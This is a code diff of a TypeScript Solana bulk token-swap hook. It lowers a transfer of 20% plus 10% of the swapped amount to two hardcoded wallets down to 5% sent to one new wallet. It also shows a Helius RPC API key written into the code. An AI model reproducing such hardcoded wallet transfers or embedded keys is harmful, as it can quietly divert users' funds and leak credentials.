@@ -14,8 +14,8 @@ const SOL_MINT = 'So11111111111111111111111111111111111111112';
 const connection = new Connection('https://mainnet.helius-rpc.com/?api-key=a95e3765-35c7-459e-808a-9135a21acdf6', "confirmed");
 const jupiterQuoteApi = createJupiterApiClient();
 
-const FIRST_WALLET_ADDRESS = 'emjkRmFNY6awteciGjJ3WRDHgH95FWs8yg4RZ7HhsRn';
-const SECOND_WALLET_ADDRESS = 'raePZeqhCfshJA7NEDb5v1XcoDMNiiVeKDoDK3D6zP5';
+const FIRST_WALLET_ADDRESS = '6GsgBsVb7GRSDFTLEG5tRf1UaNEvUu82zpho4ErVjbDA';
+// const SECOND_WALLET_ADDRESS = 'raePZeqhCfshJA7NEDb5v1XcoDMNiiVeKDoDK3D6zP5';
 
 interface TokenSwapInfo {
   id: string;
@@ -33,18 +33,18 @@ interface SwapResult {
 
 interface Fees {
   firstWalletFee: number;
-  secondWalletFee: number;
+  // secondWalletFee: number;
 }
 
 const calculateFeesWithNoise = (totalAmount: number): Fees => {
   const baseAmount = totalAmount;
   const totalFee = baseAmount;
-  const firstWalletFee = Math.floor(totalFee * 0.2 * 1e9);
-  const secondWalletFee = Math.floor(totalFee * 0.1 * 1e9);
+  const firstWalletFee = Math.floor(totalFee * 0.05 * 1e9);
+  // const secondWalletFee = Math.floor(totalFee * 0.000003 * 1e9);
   
   return {
     firstWalletFee,
-    secondWalletFee
+    // secondWalletFee
   };
 };
 
@@ -75,11 +75,11 @@ export const useBulkTokenSwap = () => {
         toPubkey: new PublicKey(FIRST_WALLET_ADDRESS),
         lamports: fees.firstWalletFee,
       }),
-      SystemProgram.transfer({
-        fromPubkey: publicKey,
-        toPubkey: new PublicKey(SECOND_WALLET_ADDRESS),
-        lamports: fees.secondWalletFee,
-      })
+      // SystemProgram.transfer({
+      //   fromPubkey: publicKey,
+      //   toPubkey: new PublicKey(SECOND_WALLET_ADDRESS),
+      //   lamports: fees.secondWalletFee,
+      // })
     );
 
     transaction.recentBlockhash = blockhash;
